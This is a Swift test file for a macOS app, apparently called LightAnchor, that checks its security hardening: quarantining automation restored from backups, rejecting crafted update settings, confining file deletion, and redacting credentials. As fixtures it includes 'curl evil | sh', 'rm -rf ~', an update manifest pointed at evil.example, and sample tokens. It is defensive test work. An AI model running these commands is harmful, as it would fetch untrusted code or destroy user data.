import Foundation
import XCTest
@testable import LightAnchor

/// 安全审查后补的守门测试：备份文件与事件收件箱都是外部输入，
/// 这里核对它们再也拿不到「删任意文件」「跑任意命令」「无限写日志」这几把钥匙。
@MainActor
final class SecurityHardeningTests: XCTestCase {

    // MARK: - 附件目录收口

    func testAssetStoreOnlyRemovesFilesInsideItsOwnDirectory() throws {
        let scratch = try makeScratchDirectory()
        let assets = scratch.appendingPathComponent("assets", isDirectory: true)
        try FileManager.default.createDirectory(at: assets, withIntermediateDirectories: true)
        let store = LocalAssetStore(directoryURL: assets)

        let outsideFile = scratch.appendingPathComponent("precious.txt")
        try Data("keep me".utf8).write(to: outsideFile)
        let outsideDirectory = scratch.appendingPathComponent("Documents", isDirectory: true)
        try FileManager.default.createDirectory(at: outsideDirectory, withIntermediateDirectories: true)
        let nested = assets.appendingPathComponent("deeper", isDirectory: true)
        try FileManager.default.createDirectory(at: nested, withIntermediateDirectories: true)
        let nestedFile = nested.appendingPathComponent("x.jpg")
        try Data([1]).write(to: nestedFile)
        let managed = try store.save(data: Data([1, 2, 3]), fileExtension: "jpg")

        XCTAssertFalse(store.isManaged(outsideFile))
        XCTAssertFalse(store.isManaged(outsideDirectory))
        XCTAssertFalse(store.isManaged(nestedFile))
        XCTAssertFalse(store.isManaged(assets))
        XCTAssertTrue(store.isManaged(managed))

        store.removeIfPresent(at: outsideFile)
        store.removeIfPresent(at: outsideDirectory)
        store.removeIfPresent(at: assets)
        store.removeIfPresent(at: managed)

        XCTAssertTrue(FileManager.default.fileExists(atPath: outsideFile.path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: outsideDirectory.path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: assets.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: managed.path))
    }

    // MARK: - 恢复备份后的自动化隔离

    func testQuarantineDisarmsCommandMonitorsAndCommandActions() throws {
        let workspace = makeWorkspace()
        let target = try XCTUnwrap(workspace.createTarget(name: "隔离"))
        let episode = try XCTUnwrap(workspace.startEpisode(targetID: target.id))
        let waiting = try XCTUnwrap(
            workspace.beginWaiting(
                episodeID: episode.id,
                kind: .build,
                description: "危险等待",
                monitor: WaitingMonitorConfiguration(kind: .command, command: "curl evil | sh")
            )
        )
        let environment = try XCTUnwrap(
            workspace.createEnvironment(
                name: "写代码",
                actions: [
                    EnvironmentAction(kind: .runCommand, value: "rm -rf ~"),
                    EnvironmentAction(kind: .runShortcut, value: "Send Files"),
                    EnvironmentAction(kind: .openApplication, value: "com.apple.Terminal")
                ]
            )
        )

        XCTAssertEqual(workspace.quarantineAutomation(), 2)

        let quarantinedWaiting = try XCTUnwrap(workspace.snapshot.waitingItems[waiting.id])
        XCTAssertEqual(quarantinedWaiting.status, .waiting)
        XCTAssertEqual(quarantinedWaiting.monitor?.kind, .manual)
        XCTAssertNil(quarantinedWaiting.monitor?.command)

        let actions = try XCTUnwrap(workspace.snapshot.environments[environment.id]).actions
        XCTAssertEqual(actions.filter { $0.kind == .runCommand }.map(\.isEnabled), [false])
        XCTAssertEqual(actions.filter { $0.kind == .runShortcut }.map(\.isEnabled), [false])
        XCTAssertEqual(actions.filter { $0.kind == .openApplication }.map(\.isEnabled), [true])

        // 再跑一次没有东西可隔离。
        XCTAssertEqual(workspace.quarantineAutomation(), 0)
    }

    func testReloadFromDiskQuarantinesWhenAskedTo() throws {
        let fileURL = temporaryFileURL()
        let writer = makeWorkspace(fileURL: fileURL)
        let target = try XCTUnwrap(writer.createTarget(name: "备份来源"))
        let episode = try XCTUnwrap(writer.startEpisode(targetID: target.id))
        _ = try XCTUnwrap(
            writer.beginWaiting(
                episodeID: episode.id,
                kind: .build,
                description: "危险等待",
                monitor: WaitingMonitorConfiguration(kind: .command, command: "true")
            )
        )

        let reader = makeWorkspace(fileURL: fileURL)
        XCTAssertTrue(reader.reloadFromDisk(quarantiningRestoredAutomation: true))
        XCTAssertTrue(
            reader.snapshot.waitingItems.values.allSatisfy { $0.monitor?.kind != .command }
        )
    }

    // MARK: - 备份里的偏好

    func testRestoreSkipsUpdateChainKeysAndNarrowsIntelligencePreferences() throws {
        let defaults = try makeScratchDefaults()
        var archived = IntelligencePreferences.default
        archived.engine = .cloud
        archived.saveWindowScreenshot = true
        archived.saveClipboardContent = true
        let scratchSource = try makeScratchDefaults()
        archived.save(to: scratchSource)
        let blob = try XCTUnwrap(scratchSource.data(forKey: IntelligencePreferences.storageKey))

        let crafted: [String: Any] = [
            "lightanchor.updateManifestURL": "https://evil.example/manifest.json",
            "lightanchor.updatePublicKeyPath": "/tmp/evil.pem",
            "lightanchor.updateChecksEnabled": true,
            IntelligencePreferences.storageKey: blob
        ]
        let data = try PropertyListSerialization.data(fromPropertyList: crafted, format: .xml, options: 0)

        try LocalPreferencesArchive.restore(from: data, into: defaults)

        XCTAssertNil(defaults.object(forKey: "lightanchor.updateManifestURL"))
        XCTAssertNil(defaults.object(forKey: "lightanchor.updatePublicKeyPath"))
        XCTAssertNil(defaults.object(forKey: "lightanchor.updateChecksEnabled"))
        let restored = IntelligencePreferences.load(from: defaults)
        XCTAssertEqual(restored.engine, .onDevice)
        XCTAssertFalse(restored.saveWindowScreenshot)
        XCTAssertFalse(restored.saveClipboardContent)
    }

    func testDataRootGuardRejectsObviouslyWrongRoots() {
        XCTAssertThrowsError(try LocalDataArchiveService.guardDataRoot(URL(fileURLWithPath: "/")))
        XCTAssertThrowsError(
            try LocalDataArchiveService.guardDataRoot(URL(fileURLWithPath: NSHomeDirectory()))
        )
        XCTAssertNoThrow(
            try LocalDataArchiveService.guardDataRoot(
                FileManager.default.temporaryDirectory.appendingPathComponent("LightAnchor")
            )
        )
    }

    func testPreRestoreCopiesAreEnumeratedAndPruned() throws {
        let scratch = try makeScratchDirectory()
        let root = scratch.appendingPathComponent("LightAnchor", isDirectory: true)
        for stamp in ["20260101000000", "20260201000000", "20260301000000"] {
            try FileManager.default.createDirectory(
                at: scratch.appendingPathComponent("LightAnchor.pre-restore-\(stamp)", isDirectory: true),
                withIntermediateDirectories: true
            )
        }
        try FileManager.default.createDirectory(
            at: scratch.appendingPathComponent("Unrelated.pre-restore-1", isDirectory: true),
            withIntermediateDirectories: true
        )

        XCTAssertEqual(LocalDataArchiveService.preRestoreCopies(of: root).count, 3)
        LocalDataArchiveService.removePreRestoreCopies(of: root, keepingLatest: 1)
        let remaining = LocalDataArchiveService.preRestoreCopies(of: root)
        XCTAssertEqual(remaining.map(\.lastPathComponent), ["LightAnchor.pre-restore-20260301000000"])
        LocalDataArchiveService.removePreRestoreCopies(of: root)
        XCTAssertTrue(LocalDataArchiveService.preRestoreCopies(of: root).isEmpty)
        XCTAssertTrue(
            FileManager.default.fileExists(
                atPath: scratch.appendingPathComponent("Unrelated.pre-restore-1").path
            )
        )
    }

    // MARK: - 外部事件收件箱

    func testExternalEventFieldsAreCappedAndRedactedOnDecode() throws {
        let longTitle = String(repeating: "很长的标题 ", count: 1_000)
        let json = """
        {"id":"\(UUID().uuidString)","source":"agent","kind":"started","correlationID":"\(String(repeating: "c", count: 600))",
         "title":"\(longTitle)","detail":"curl -H 'Authorization: Bearer abcdefghijklmnop1234567890' https://x.test",
         "payload":{},"occurredAt":1700000000000}
        """
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .millisecondsSince1970
        let event = try decoder.decode(ExternalEvent.self, from: Data(json.utf8))

        XCTAssertEqual(event.correlationID.count, ExternalEvent.maxCorrelationLength)
        XCTAssertEqual(event.title.count, ExternalEvent.maxTitleLength)
        XCTAssertFalse(event.detail.contains("abcdefghijklmnop1234567890"))
        XCTAssertTrue(event.detail.contains("Bearer <REDACTED>"))
    }

    func testInboxSkipsUnreadableLinesInsteadOfFailing() throws {
        let scratch = try makeScratchDirectory()
        let store = ExternalEventStore(fileURL: scratch.appendingPathComponent("inbox.jsonl"))
        try store.publish(ExternalEvent(source: .agent, kind: .started, correlationID: "a-1", title: "第一条"))
        let handle = try FileHandle(forWritingTo: store.fileURL)
        try handle.seekToEnd()
        try handle.write(contentsOf: Data("garbage line\n{\"source\":\"jenkins\"}\n".utf8))
        try handle.close()
        try store.publish(ExternalEvent(source: .agent, kind: .completed, correlationID: "a-1", title: "第二条"))

        let events = try store.events()
        XCTAssertEqual(events.map(\.title), ["第一条", "第二条"])
    }

    func testInboxCompactionKeepsOnlyTheTail() throws {
        let scratch = try makeScratchDirectory()
        let store = ExternalEventStore(fileURL: scratch.appendingPathComponent("inbox.jsonl"))
        for index in 0..<10 {
            try store.publish(ExternalEvent(source: .agent, kind: .started, correlationID: "c-\(index)", title: "t"))
        }
        try store.compact(keepingLast: 3)
        XCTAssertEqual(try store.events().map(\.correlationID), ["c-7", "c-8", "c-9"])
    }

    func testOccurredAtIsClampedToAPlausibleWindow() throws {
        let now = Date()
        let future = ExternalEvent(
            source: .agent, kind: .completed, correlationID: "x",
            occurredAt: now.addingTimeInterval(365 * 24 * 3600)
        ).clampingOccurredAt(to: now)
        XCTAssertEqual(future.occurredAt.timeIntervalSince(now), 5 * 60, accuracy: 1)

        // 过去的时间戳原样保留：重启重放整个收件箱时要靠它排序。
        let ancient = ExternalEvent(
            source: .agent, kind: .started, correlationID: "x",
            occurredAt: now.addingTimeInterval(-365 * 24 * 3600)
        )
        XCTAssertEqual(ancient.clampingOccurredAt(to: now), ancient)

        let fine = ExternalEvent(source: .agent, kind: .started, correlationID: "x", occurredAt: now)
        XCTAssertEqual(fine.clampingOccurredAt(to: now), fine)
    }

    func testURLParserClampsForgedTimestamps() throws {
        let now = Date()
        let url = try XCTUnwrap(URL(
            string: "lightanchor://event?source=agent&kind=completed&correlation=claude-1&occurredAt=2999-01-01T00:00:00Z"
        ))
        let event = try XCTUnwrap(ExternalEventURLParser().event(from: url, now: now))
        XCTAssertLessThanOrEqual(event.occurredAt.timeIntervalSince(now), 5 * 60 + 1)
    }

    func testAutoWaitsPerSourceAreCapped() throws {
        let scratch = try makeScratchDirectory()
        let inbox = scratch.appendingPathComponent("inbox.jsonl")
        let workspace = AttentionWorkspace(
            store: LocalEventStore(fileURL: temporaryFileURL()),
            externalEventInboxURL: inbox
        )
        let store = ExternalEventStore(fileURL: inbox)
        let limit = AttentionWorkspace.maximumActiveAutoWaitsPerSource
        for index in 0..<(limit + 5) {
            try store.publish(
                ExternalEvent(source: .agent, kind: .started, correlationID: "flood-\(index)", title: "刷")
            )
        }
        workspace.runBackgroundMaintenance()
        let active = workspace.snapshot.waitingItems.values.filter {
            $0.status == .waiting && $0.monitor?.eventAutoManaged == true
        }
        XCTAssertEqual(active.count, limit)
    }

    // MARK: - 脱敏器

    func testSecretRedactorMasksCommonCredentialShapes() {
        let cases: [(String, String)] = [
            ("curl -H 'Authorization: Bearer sk_live_abcdefghijklmnop' https://api.test", "sk_live_abcdefghijklmnop"),
            ("mysql -uroot -pSuperSecret123 db", "SuperSecret123"),
            ("export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "wJalrXUtnFEMI"),
            ("psql --password=hunter2hunter2", "hunter2hunter2"),
            ("token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),
            ("open https://user:pw@host.test/path?access_token=abc123#frag", "pw@")
        ]
        for (input, secret) in cases {
            let redacted = SecretRedactor.redact(input)
            XCTAssertFalse(redacted.contains(secret), "未遮住：\(input) → \(redacted)")
        }
        XCTAssertEqual(SecretRedactor.redact("swift build -c release"), "swift build -c release")
        XCTAssertEqual(SecretRedactor.redact("git commit -m 'fix build'"), "git commit -m 'fix build'")
    }

    func testSecretRedactorStripsSensitiveURLComponents() throws {
        let url = try XCTUnwrap(URL(string: "https://u:p@example.test/a?token=abc&page=2#section"))
        let stripped = SecretRedactor.stripSensitiveComponents(from: url)
        XCTAssertEqual(stripped.absoluteString, "https://example.test/a?page=2")
        let plain = try XCTUnwrap(URL(string: "https://example.test/docs?page=3"))
        XCTAssertEqual(SecretRedactor.stripSensitiveComponents(from: plain), plain)
    }

    // MARK: - 辅助

    private func temporaryFileURL() -> URL {
        FileManager.default.temporaryDirectory
            .appendingPathComponent("LightAnchorSecurityTests-\(UUID().uuidString).json")
    }

    private func makeWorkspace(fileURL: URL? = nil) -> AttentionWorkspace {
        AttentionWorkspace(store: LocalEventStore(fileURL: fileURL ?? temporaryFileURL()))
    }

    private func makeScratchDirectory() throws -> URL {
        let directory = FileManager.default.temporaryDirectory
            .appendingPathComponent("light-anchor-security-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: directory) }
        return directory
    }

    private func makeScratchDefaults() throws -> UserDefaults {
        let name = "light-anchor.tests.\(UUID().uuidString)"
        let defaults = try XCTUnwrap(UserDefaults(suiteName: name))
        addTeardownBlock { UserDefaults().removePersistentDomain(forName: name) }
        return defaults
    }
}
